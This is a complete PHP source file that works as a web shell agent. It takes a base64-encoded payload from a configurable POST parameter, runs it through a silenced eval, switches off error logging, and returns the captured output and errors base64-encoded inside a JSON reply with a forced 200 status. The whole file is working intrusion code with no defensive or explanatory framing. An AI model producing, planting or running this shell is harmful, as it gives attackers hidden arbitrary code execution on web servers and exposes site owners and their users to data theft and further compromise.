<?php
//global: $payload_param_name
ini_set('display_errors', 'off');
ini_set('log_errors', 'off');
error_reporting(-1);
$result = array('code'=>1, 'msg'=>array(), 'data'=>'');
function add_error_info($error_no, $error_msg, $iswarning){
    global $result;
    $tmp = array();
    $tmp['errcode'] = $error_no;
    $tmp['errmsg'] = base64_encode($error_msg);
    $tmp['iswarning'] = $iswarning;
    $result['msg'][] = $tmp;
}
set_error_handler(function ($error_no, $error_msg, $error_file, $error_line) {
    global $result;
    $msg = $error_msg." on ".$error_file;
    add_error_info($error_no, $msg, $error_no != E_USER_ERROR);
    if($error_no == E_USER_ERROR){
        $result['code'] = -1;//表示致命错误，脚本需要中断返回
        exit(0);
    }else{
        $result['code'] = 0;//普通错误，只提示不中断
    }
});
set_exception_handler(null);
register_shutdown_function(function (){
    //无论是否发生错误都会返回
    global $result, $raw_level;
    if(ob_get_level() == $raw_level){//当payload执行终止时获取终止前的输出内容（如调用了die函数）
        $content = ob_get_contents();
        ob_end_clean();
        $content = base64_encode($content);
        $result['data'] = $content;
    }
    header("HTTP/1.0 200 OK");
    echo json_encode($result);
});
function E($payload){@eval($payload);}

header('Content-Type: text/json;charset=utf-8');
$payload = '';
if(isset($_POST[$payload_param_name])){
    $payload = $_POST[$payload_param_name];
}
try{
    $payload = base64_decode($payload);
    ob_start();
    $raw_level = ob_get_level();
    E($payload);
    $content = ob_get_contents();
    ob_end_clean();
    if($content === false){
        throw new Exception("Eval code got content failed!");
    }
    $content = base64_encode($content);
    $result['data'] = $content;
}catch(Exception $e){
    $result['code'] = -1;
    $code = is_integer($e->getCode())?$e->getCode():1;
    add_error_info($code+65535, $e->getMessage().$e->getTraceAsString(), false);
}catch(Error $err){
    $result['code'] = -1;
    $code = is_integer($err->getCode())?$err->getCode():1;
    add_error_info($code+65535, $err->getMessage().$err->getTraceAsString(), false);
}